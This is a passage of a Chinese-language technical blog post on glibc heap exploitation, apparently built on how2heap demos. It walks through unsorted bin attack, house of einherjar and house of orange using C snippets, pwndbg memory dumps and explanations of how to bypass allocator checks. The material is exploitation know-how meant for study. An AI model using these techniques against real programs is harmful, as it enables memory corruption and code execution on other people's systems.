(main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>fake chunk 被取出，而 victim chunk 被从 unsorted bin 中取出来放到了 small bin 中。另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址，这正是下面 unsorted bin attack 会讲到的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="number">30</span>   <span class="keyword">intptr_t</span>* fake = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// malloc a new chunk from fake chunk.</span></span><br><span class="line"><span class="number">31</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %p\n&quot;</span>, fake);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx fake-2</span><br><span class="line">0x7fffffffe3f0:0x00000000000000000x0000000000000110   &lt;-- chunk</span><br><span class="line">0x7fffffffe400:0x00007ffff7dd1b580x00007fffffffe3f0     &lt;---fd ,bk //new fd ---&gt; 0x7ffff7dd1b58</span><br><span class="line">0x7fffffffe410:0x00007fffffffe5000x29b3145efbaf1600</span><br><span class="line">0x7fffffffe420:0x00000000004008600x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:0x00000000000400000x00007fffffffe508</span><br><span class="line">0x7fffffffe440:0x00000001f7b9a4880x0000000000400686</span><br><span class="line">0x7fffffffe450:0x00000000000000000x595c9e280b1d3a76</span><br><span class="line">0x7fffffffe460:0x00000000004005900x00007fffffffe500</span><br><span class="line">0x7fffffffe470:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe480:0xa6a36157d3bd3a760xa6a371ee1c8f3a76</span><br></pre></td></tr></table></figure><h3 id="0x13-unsorted-bin-attack"><a href="#0x13-unsorted-bin-attack" class="headerlink" title="0x13 unsorted_bin_attack"></a>0x13 unsorted_bin_attack</h3><p>unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。</p><p>unlink 的对 unsorted bin 的操作是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>首先，分配 两个 chunk，释放第一个 使其加入到 unstorted bin</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>紧接着，我假设我们有堆溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span> p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="number">27</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>去修改，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个 fake free chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p</span><br><span class="line"><span class="variable">$1</span> = (unsigned long *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx p</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx p[1]</span><br><span class="line">0x7ffff7dd1b58 &lt;main_arena+88&gt;:0x00000000006023a00x0000000000000000</span><br><span class="line">0x7ffff7dd1b68 &lt;main_arena+104&gt;:0x00000000006020000x0000000000602000</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+120&gt;:0x00007ffff7dd1b680x00007ffff7dd1b68</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+136&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+152&gt;:0x00007ffff7dd1b880x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+168&gt;:0x00007ffff7dd1b980x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+184&gt;:0x00007ffff7dd1ba80x00007ffff7dd1ba8</span><br><span class="line">0x7ffff7dd1bc8 &lt;main_arena+200&gt;:0x00007ffff7dd1bb80x00007ffff7dd1bb8</span><br><span class="line">0x7ffff7dd1bd8 &lt;main_arena+216&gt;:0x00007ffff7dd1bc80x00007ffff7dd1bc8</span><br><span class="line">0x7ffff7dd1be8 &lt;main_arena+232&gt;:0x00007ffff7dd1bd80x00007ffff7dd1bd8</span><br></pre></td></tr></table></figure><p>此时，chunk 1的 bk已经被修改</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 417,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7fffffffe3c8,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们 malloc 一块新 chunk，这个时候，系统为循着 bk去 malloc一块新chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx &amp;stack_var-2</span><br><span class="line">0x7fffffffe3c8:0x000000000040081a0x0000000000400880           &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3d8:0x00007ffff7dd1b580x0000000000602010 &lt;--- fd</span><br><span class="line">0x7fffffffe3e8:0x3cc687447353a2000x0000000000400880</span><br><span class="line">0x7fffffffe3f8:0x00007ffff7a303f10x0000000000040000</span><br><span class="line">0x7fffffffe408:0x00007fffffffe4d80x00000001f7b9a488</span><br><span class="line">0x7fffffffe418:0x00000000004006860x0000000000000000</span><br><span class="line">0x7fffffffe428:0x577f97b5f5d4f6ba0x0000000000400590</span><br><span class="line">0x7fffffffe438:0x00007fffffffe4d00x0000000000000000</span><br><span class="line">0x7fffffffe448:0x00000000000000000xa88068ca2cd4f6ba</span><br><span class="line">0x7fffffffe458:0xa8807873e386f6ba0x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="0x14-house-of-einherjar"><a href="#0x14-house-of-einherjar" class="headerlink" title="0x14 house_of_einherjar"></a>0x14 house_of_einherjar</h3><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。</p><p>它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 <code>PREV_IN_USE</code> 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。</p><p>首先，我们先 malloc 一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br></pre></td></tr></table></figure><p>然后，我们fake一个chunk ，用来之后  free 掉 next  chunk的时候，让合并后的堆块到 fake chunk 处，那下一次 malloc 将返回我们想要的地址。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$1</span> = &#123;256, 256, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br><span class="line">pwndbg&gt; x/20gx &amp;fake_chunk</span><br><span class="line">0x7fffffffe3b0:0x00000000000001000x0000000000000100</span><br><span class="line">0x7fffffffe3c0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:0x00007fffffffe4d00x3c402f70cff21400</span><br><span class="line">0x7fffffffe3f0:0x0000000000400bf00x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:0x00000000000400000x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:0x00000001f7b9a4880x00000000004006d6</span><br><span class="line">0x7fffffffe420:0x00000000000000000x86f4a78e4a5b6ea9</span><br><span class="line">0x7fffffffe430:0x00000000004005e00x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>然后，在 malloc 一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br></pre></td></tr></table></figure><p>紧接着，我们假设有个 堆溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="number">67</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line"><span class="number">69</span> a[real_a_size] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>修改掉 chunk b 的size </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603040</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">256</span>,  <span class="comment">// 257 --&gt; 256</span></span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还得让 prev_size 字段为 fake chunk 的大小</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$8</span> = &#123;256, 18446603336227507344, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br></pre></td></tr></table></figure><p>chunk b的 prev_size 字段，用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要将 fake chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br></pre></td></tr></table></figure><p>chunk b</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603040 &#123;</span><br><span class="line">  prev_size = 18446603336227507344,  // 0 -&gt; 18446603336227507344</span><br><span class="line">  size = 256,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们 free 掉 chunk b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">88</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="number">89</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">90</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>然后，我们会发现 top chunk 变了,top chunk -&gt; fake_chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x7fffffffe3b0,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">  bins = &#123;0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bc8 &lt;main_arena+200&gt;...&#125;,</span><br><span class="line">  binmap = &#123;0, 0, 0, 0&#125;,</span><br><span class="line">  next = 0x7ffff7dd1b00 &lt;main_arena&gt;,</span><br><span class="line">  next_free = 0x0,</span><br><span class="line">  attached_threads = 1,</span><br><span class="line">  system_mem = 135168,</span><br><span class="line">  max_system_mem = 135168</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p &amp;fake_chunk</span><br><span class="line"><span class="variable">$10</span> = (size_t (*)[6]) 0x7fffffffe3b0</span><br></pre></td></tr></table></figure><p>由于，我们释放 chunk b，这时因为 <code>PREV_INUSE</code> 为零，unlink 会根据 prev_size 去寻找上一个 free chunk，并将它和当前 chunk 合并。</p><p>这意味着，当我们 再去 malloc 一块 新chunk的时候，将会是 fake chunk 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">103</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line"><span class="number">104</span>     d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br></pre></td></tr></table></figure><p>如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx fake_chunk</span><br><span class="line">0x7fffffffe3b0:0x00000000000001000x0000000000000211</span><br><span class="line">0x7fffffffe3c0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:0x00007fffffffe3b00x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:0x00007fffffffe4d00xc6f3cea232483100</span><br><span class="line">0x7fffffffe3f0:0x0000000000400bf00x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:0x00000000000400000x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:0x00000001f7b9a4880x00000000004006d6</span><br><span class="line">0x7fffffffe420:0x00000000000000000x0575c70b1ba71a36</span><br><span class="line">0x7fffffffe430:0x00000000004005e00x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; p d</span><br><span class="line"><span class="variable">$14</span> = (uint8_t *) 0x7fffffffe3c0 <span class="string">&quot;\260\343\377\377\377\177&quot;</span></span><br></pre></td></tr></table></figure><p>值得一提的是，这里绕过 unlink 检查的时候，直接：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure><h3 id="0x15-house-of-orange"><a href="#0x15-house-of-orange" class="headerlink" title="0x15 house of orange"></a>0x15 house of orange</h3><p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin)。 这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。</p><p>我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 <code>sysmalloc()</code> 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 <code>mp_.mmap_threshold</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;&#x3D; (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p><p>为了能够调用 <code>sysmalloc()</code> 中的 <code>_int_free()</code>，需要 top chunk 大于 <code>MINSIZE</code>，即 0x10</p><p>当然，还得绕过下面两个限制条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>即满足 old_size 小于 <code>nb+MINSIZE</code>，<code>PREV_INUSE</code> 标志位为 1，<code>old_top+old_size</code> 页对齐这几个条件。</p><p>我们总结一下伪造的top chunk size的要求</p><p>1.伪造的size必须要对齐到内存页</p><p>2.size要大于MINSIZE(0x10)</p><p>3.size要小于之后申请的chunk size + MINSIZE(0x10)</p><p>4.size的prev inuse位必须为1</p><p>之后原有的top chunk就会执行<code>_int_free</code>从而顺利进入unsorted bin中。</p><p>在这个例子中:</p><p>我们首先 malloc 一个 0x400 的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1025,  // hex(1025) == 0x401</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下 ，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; top_chunk</span><br><span class="line">0x602400 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134145,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20gx 0x602400</span><br><span class="line">0x602400:0x00000000000000000x0000000000020c01  &lt;--- top chunk // size</span><br><span class="line">0x602410:0x00000000000000000x0000000000000000</span><br><span class="line">0x602420:0x00000000000000000x0000000000000000</span><br><span class="line">0x602430:0x00000000000000000x0000000000000000</span><br><span class="line">0x602440:0x00000000000000000x0000000000000000</span><br><span class="line">0x602450:0x00000000000000000x0000000000000000</span><br><span class="line">0x602460:0x00000000000000000x0000000000000000</span><br><span class="line">0x602470:0x00000000000000000x0000000000000000</span><br><span class="line">0x602480:0x00000000000000000x0000000000000000</span><br><span class="line">0x602490:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>此时，我们假设有溢出漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">72</span>     top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line"><span class="number">73</span>     top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure><p> 将top chunk 的size 改为 0xc01 ，这样就能满足上面总结的条件。</p><p>之后，我们申请的 0x1000 size 的 chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure><p>0x1000 &gt; 0xc01 , 又由于 top chunk  的伪造满足条件，紧接着原有的 top chunk 会被放到 unsorted bins里</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span 